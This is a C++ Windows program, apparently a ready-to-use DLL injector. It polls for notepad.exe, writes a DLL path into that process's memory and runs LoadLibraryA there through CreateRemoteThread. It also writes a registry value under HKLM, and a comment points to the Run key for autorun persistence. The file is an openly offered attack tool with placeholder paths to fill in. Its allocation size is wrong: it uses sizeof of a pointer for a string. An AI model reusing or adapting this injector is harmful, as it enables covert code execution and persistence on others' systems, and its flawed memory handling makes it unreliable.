#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

using namespace std;

DWORD getProcId(string name)
{
    DWORD processId = 0;
    HANDLE hSnap;


    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &procEntry))
        {
            do {
                if (!strcmp(procEntry.szExeFile, name.c_str()))
                {
                    processId = procEntry.th32ProcessID;
                    break;
                }

            } while (Process32Next(hSnap, &procEntry));

        }

    }
    CloseHandle(hSnap);
    return processId;
} //Process Snapshot function


VOID runAlways()
{
    unsigned char dwData[] = "Say Hello to my Little Friend";
    HKEY hKey;
    LONG reg;
    reg = RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Example", NULL, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);

    if (reg != ERROR_SUCCESS)
    {
        cout << "RegCreateKeyEx failed & Status Code - " << GetLastError() << endl;
        exit(-1);
    }

    reg = RegSetValueEx(hKey, "ak47", 0, REG_SZ, (LPBYTE)&dwData, sizeof(dwData));

    RegCloseKey(hKey);
}  // //You can modify here. Because I was making for Autorun (SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\your app path)

int main()
{

    runAlways();

    DWORD procID = 0;
    const char* dllPath = "put your dll path"; //Dll path
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID LoadLibrary = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"); //Get Modules
    while (!procID)
    {
        procID = getProcId("notepad.exe"); //Process Name 
        Sleep(30);
    } //loop for snapshot

    cout << "Process Found --->>>" << procID << endl;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, procID);

    if (hProcess != INVALID_HANDLE_VALUE)
    {
        LPVOID loc = VirtualAllocEx(hProcess, 0, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        cout << "Tunnel ---->>" << loc << endl;
        WriteProcessMemory(hProcess, loc, dllPath, strlen(dllPath) + 1, NULL);

        hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, (LPVOID)loc, 0, 0);

        if (hThread)
        {
            CloseHandle(hThread);
        }

        cout << "İnject Successful" << endl;
        cout << "Location ---->>" << loc << endl;
    }
    CloseHandle(hProcess);
    return 0;
}